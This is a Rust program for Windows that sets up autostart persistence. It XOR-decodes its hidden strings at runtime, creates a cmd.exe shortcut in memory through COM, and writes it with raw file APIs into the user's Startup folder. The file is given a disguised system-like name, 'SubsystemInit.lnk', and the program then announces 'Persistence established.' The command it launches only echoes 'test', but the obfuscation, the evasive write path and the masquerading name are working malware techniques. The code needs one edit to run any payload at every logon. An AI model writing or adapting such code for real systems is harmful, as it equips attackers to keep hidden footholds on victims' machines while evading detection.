#![allow(non_upper_case_globals)]

use windows::{
    core::*,
    Win32::Foundation::*,
    Win32::System::Com::*,
    Win32::System::Com::StructuredStorage::*,
    Win32::System::Memory::*,
    Win32::UI::Shell::*,
    Win32::Storage::FileSystem::*,
};

// Manually define GUIDs for consistency
const FOLDERID_Startup: GUID = GUID::from_u128(0xB97D20BB_F46A_4C97_BA10_5E3608430854);
const CLSID_ShellLink: GUID = GUID::from_u128(0x00021401_0000_0000_C000_000000000046);

// Simple XOR decryption utility
fn d(encoded: &[u8], key: u8) -> String {
    let decrypted: Vec<u8> = encoded.iter().map(|&b| b ^ key).collect();
    String::from_utf8_lossy(&decrypted).into_owned()
}

// Helper to convert String to wide string for Win32
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn main() -> Result<()> {
    unsafe {
        // Key for XOR obfuscation
        let k = 0x55;

        // Obfuscated strings
        let enc_cmd = [22, 111, 9, 2, 60, 59, 49, 58, 34, 38, 9, 6, 44, 38, 33, 48, 56, 102, 103, 9, 54, 56, 49, 123, 48, 45, 48];
        let enc_args = [122, 54, 117, 48, 54, 61, 58, 117, 119, 33, 48, 38, 33, 119];
        let enc_desc = [16, 54, 61, 58, 117, 1, 48, 38, 33, 117, 6, 61, 58, 39, 33, 54, 32, 33];
        let enc_name = [6, 32, 55, 38, 44, 38, 33, 48, 56, 28, 59, 60, 33, 123, 57, 59, 62];

        // Decrypt strings at runtime
        let target_path = d(&enc_cmd, k);
        let arguments = d(&enc_args, k);
        let description = d(&enc_desc, k);
        let link_name = d(&enc_name, k);

        // Initialize COM (Single-Threaded Apartment)
        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;

        // Create an instance of the ShellLink COM object
        let shell_link: IShellLinkW = CoCreateInstance(&CLSID_ShellLink, None, CLSCTX_INPROC_SERVER)?;

        // Set the target path of the shortcut
        shell_link.SetPath(PCWSTR(to_wide(&target_path).as_ptr()))?;

        // Set the arguments
        shell_link.SetArguments(PCWSTR(to_wide(&arguments).as_ptr()))?;

        // Set a description
        shell_link.SetDescription(PCWSTR(to_wide(&description).as_ptr()))?;

        // Query for the IPersistStream interface instead of IPersistFile
        let persist_stream: IPersistStream = shell_link.cast()?;

        // Create an in-memory stream
        let stream = CreateStreamOnHGlobal(None, true)?;

        // Save the shortcut data to the in-memory stream
        persist_stream.Save(&stream, true)?;

        // Get the size and pointer to the stream data
        let mut stat = STATSTG::default();
        stream.Stat(&mut stat, STATFLAG_DEFAULT)?;

        let hglobal = GetHGlobalFromStream(&stream)?;
        let data_ptr = GlobalLock(hglobal);

        if data_ptr.is_null() {
            return Err(Error::from(HRESULT(0x80004005u32 as i32)));
        }

        // Retrieve the path to the Windows Startup folder
        let path_ptr = SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DEFAULT, HANDLE(0))?;
        let startup_path = path_ptr.to_string().map_err(|_| Error::from(HRESULT(0x80004005u32 as i32)))?;
        CoTaskMemFree(Some(path_ptr.0 as _));

        // Construct the full path for the new .lnk file
        let lnk_path = format!("{}\\{}", startup_path, link_name);
        let lnk_path_wide = to_wide(&lnk_path);

        // Write the data to disk using standard Win32 File APIs
        let file_handle = CreateFileW(
            PCWSTR(lnk_path_wide.as_ptr()),
            GENERIC_WRITE.0,
            FILE_SHARE_NONE,
            None,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0),
        )?;

        let mut bytes_written = 0;
        let buffer = std::slice::from_raw_parts(data_ptr as *const u8, stat.cbSize as usize);
        WriteFile(file_handle, Some(buffer), Some(&mut bytes_written), None)?;

        CloseHandle(file_handle)?;
        let _ = GlobalUnlock(hglobal);

        println!("Persistence established.");

        // Uninitialize COM
        CoUninitialize();
    }
    Ok(())
}
